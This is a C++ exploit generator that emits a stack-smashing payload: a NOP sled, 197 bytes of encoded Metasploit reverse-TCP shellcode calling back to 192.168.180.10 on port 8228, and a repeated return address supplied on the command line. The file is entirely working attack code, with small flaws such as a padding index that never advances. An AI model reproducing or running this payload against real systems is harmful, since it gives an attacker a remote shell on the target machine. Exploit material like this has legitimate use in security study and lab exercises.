#include <iostream>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <string>

/*
 * linux/x86/shell_reverse_tcp - 197 bytes
 * https://metasploit.com/
 * Encoder: x86/alpha_mixed
 * VERBOSE=false, LHOST=192.168.180.10, LPORT=8228, 
 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
 * StagerRetryCount=10, StagerRetryWait=5, PrependFork=false, 
 * PrependSetresuid=false, PrependSetreuid=false, 
 * PrependSetuid=false, PrependSetresgid=false, 
 * PrependSetregid=false, PrependSetgid=false, 
 * PrependChrootBreak=false, AppendExit=false, 
 * MeterpreterDebugLevel=0, RemoteMeterpreterDebugFile=, 
 * CreateSession=true, AutoVerifySession=true, CMD=/bin/sh
 */
unsigned char gbuf[] = 
"\x89\xe6\xd9\xc7\xd9\x76\xf4\x59\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75"
"\x61\x59\x4b\x6c\x37\x59\x73\x72\x73\x31\x53\x33\x63\x30\x6a"
"\x65\x52\x6e\x69\x48\x61\x78\x30\x71\x76\x7a\x6d\x4f\x70\x4d"
"\x43\x63\x69\x38\x30\x37\x4f\x48\x4d\x6f\x70\x67\x39\x63\x49"
"\x58\x79\x42\x48\x49\x50\x6c\x68\x4e\x54\x56\x6a\x73\x58\x37"
"\x72\x43\x30\x61\x30\x67\x54\x4c\x49\x78\x61\x4c\x70\x43\x56"
"\x36\x30\x52\x71\x43\x63\x68\x33\x57\x73\x4c\x49\x69\x71\x5a"
"\x6d\x4b\x30\x71\x42\x61\x78\x50\x6e\x74\x6f\x74\x33\x75\x38"
"\x62\x48\x64\x6f\x76\x4f\x50\x62\x61\x79\x6c\x49\x39\x73\x36"
"\x32\x42\x73\x4c\x49\x39\x71\x4c\x70\x46\x6b\x38\x4d\x6f\x70"
"\x41\x41";


int main(int argc, char * argv[])
{
  if (argc != 3) {
    std::cerr << "Usage: ./exploit <address> <size>"
    << "\n";
    exit(1);
  }
  else {
  
    size_t size = atoi(argv[2]);
    unsigned char buf[size];

    size_t nop = 200;
    size_t i;

    // Build nop sleds
    for (i = 0 ; i < nop ; i++) {
      buf[i] = '\x90';
    }

    for (size_t j = 0 ; j < 197 ; j++) {
      buf[i] = gbuf[j];
      i++;
    }

    size_t k = 0;
    while (i < size) {
      buf[i] = argv[1][k%4];
      i++;
    }
    
    std::cout << buf;
  }

  return 1;
}















